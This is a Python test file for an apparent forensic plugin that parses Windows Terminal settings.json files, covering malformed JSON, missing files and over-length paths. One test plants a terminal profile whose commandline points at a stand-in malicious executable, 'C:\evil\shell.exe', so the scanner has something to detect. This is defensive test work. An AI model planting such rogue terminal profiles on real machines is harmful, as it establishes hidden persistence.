def test_malformed_json_reports_lost_coverage(tmp_path: Path) -> None:
    """A settings.json that exists but will not parse is coverage the scan lost."""
    plugin = _terminal_plugin(tmp_path)
    _write_settings(plugin, "user1", _PACKAGED, "{broken json!!!")
    assert plugin.run() == []
    failures = artifact_failures()
    assert len(failures) == 1
    assert failures[0].check_id.startswith("windows_terminal artifact ")
    # The ledger names the artifact by its host path, whose separator is the
    # analyst's, so the identity is compared as a path and not as a substring.
    resolved = plugin.filesystem.resolve(rf"Users\user1\{_PACKAGED}")
    assert str(resolved) in failures[0].check_id


def test_absent_settings_file_is_silent(tmp_path: Path) -> None:
    """A user without Windows Terminal is a real negative, not lost coverage."""
    plugin = _terminal_plugin(tmp_path)
    assert plugin.run() == []
    assert artifact_failures() == ()


def test_strip_jsonc_leaves_a_plain_document_untouched() -> None:
    """A file with no comments and no trailing commas passes through unchanged."""
    text = json.dumps({"profiles": {"list": [{"commandline": "a//b"}]}}, indent=4)
    assert strip_jsonc(text) == text


def _over_length_username(tmp_path: Path) -> str:
    """Name a user whose settings.json lands past the length Win32 will open."""
    username = "u"
    while len(str(tmp_path.joinpath("Users", username, *_PACKAGED.split("\\")))) < 270:
        username += "x"
    return username


def test_settings_beyond_the_win32_path_limit_is_parsed(tmp_path: Path) -> None:
    """An over-length settings.json is read, not confirmed present and then dropped."""
    username = _over_length_username(tmp_path)
    settings_path = tmp_path.joinpath("Users", username, *_PACKAGED.split("\\"))
    plugin = _terminal_plugin(tmp_path, username)
    document = json.dumps(
        {"profiles": {"list": [{"commandline": "C:\\evil\\shell.exe"}]}}
    )

    try:
        _io_path(settings_path.parent).mkdir(parents=True, exist_ok=True)
        _io_path(settings_path).write_text(document, encoding="utf-8")

        findings = plugin.run()
        assert len(findings) == 1
        assert findings[0].value == "C:\\evil\\shell.exe"
        assert artifact_failures() == ()
    finally:
        remove_over_length_tree(settings_path, tmp_path)


def test_absent_over_length_settings_file_is_silent(tmp_path: Path) -> None:
    """A user without Windows Terminal is a real negative at any path length."""
    plugin = _terminal_plugin(tmp_path, _over_length_username(tmp_path))
    assert plugin.run() == []
    assert artifact_failures() == ()
